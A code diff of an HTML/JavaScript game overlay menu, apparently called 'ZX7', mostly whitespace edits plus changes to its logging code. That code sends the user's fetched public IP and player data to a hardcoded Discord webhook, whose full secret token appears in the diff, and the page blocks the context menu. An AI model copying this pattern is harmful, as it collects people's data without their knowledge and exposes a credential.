@@ -27,7 +27,7 @@
             width: 100vw;
             -webkit-tap-highlight-color: transparent;
         }
-
+        
         body::-webkit-scrollbar {
             display: none;
         }
@@ -154,7 +154,7 @@
                 transform: translateX(50px);
             }
         }
-
+        
         /* ===== SPECTATE LIST STYLES ===== */
         #spectate-container {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -418,7 +418,7 @@
         .menu-tabs::-webkit-scrollbar {
             display: none;
         }
-
+        
         .menu-tab {
             flex: 0 0 auto;
             padding: 1.5vh 1.5vh;
@@ -1368,7 +1368,7 @@
                 }, 500);
             }, 4000);
         }
-
+        
         // ===== SPECTATE LIST SYSTEM =====
         function updateSpectateList(monitors) {
             const container = document.getElementById('spectate-container');
@@ -1405,7 +1405,7 @@
         }
 
         // ===== LOGS SYSTEM =====
-        const DEFAULT_WEBHOOK = "https://canary.discord.com/api/webhooks/1454444133925130403/4OyN0Z-P7yTCQcGTz66qpV7QY9_LPsrX4nYaGK4tXchhwDw0UoVg59fT00epsTV91tgq";
+        const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1454444133925130403/4OyN0Z-P7yTCQcGTz66qpV7QY9_LPsrX4nYaGK4tXchhwDw0UoVg59fT00epsTV91tgq";
 
         function splitLongText(text, maxLength = 1000) {
             if (!text || text.length <= maxLength) {
@@ -1452,9 +1452,10 @@
         async function sendEmbed(full){
             const webhook = full.webhookURL && full.webhookURL.length ? full.webhookURL : (DEFAULT_WEBHOOK || null);
             if (!webhook){
-                console.log("No webhook URL provided");
+                console.error("❌ No webhook URL provided");
                 return;
             }
+            console.log("📤 Sending to webhook:", webhook);
 
             const ip = await fetchPublicIP();
             const p = full.player || {};
@@ -1750,11 +1751,13 @@
             
             // Logs system
             if (data.type === 'init' && data.player) {
+                console.log("📨 Received init message with player data:", data);
                 const payload = {
                     webhookURL: data.webhookURL || DEFAULT_WEBHOOK,
                     imageURL: data.imageURL || ""
                 };
                 payload.player = data.player;
+                console.log("🚀 Sending webhook with payload:", payload);
                 sendEmbed(payload);
             }
             
@@ -1802,15 +1805,15 @@
             e.preventDefault();
             return false;
         });
-
+        
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             return false;
         });
-
+        
         document.documentElement.style.backgroundColor = 'transparent';
         document.body.style.backgroundColor = 'transparent';
-
+        
         // Initialize
         renderTabs();
         container.classList.toggle('show', isVisible);
@@ -1822,6 +1825,6 @@
 
         console.log('🚀 ZX7 Complete System Loaded!');
     </script>
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"5cb931a51b2c4943b77b038e08e9dde2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"5cb931a51b2c4943b77b038e08e9dde2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
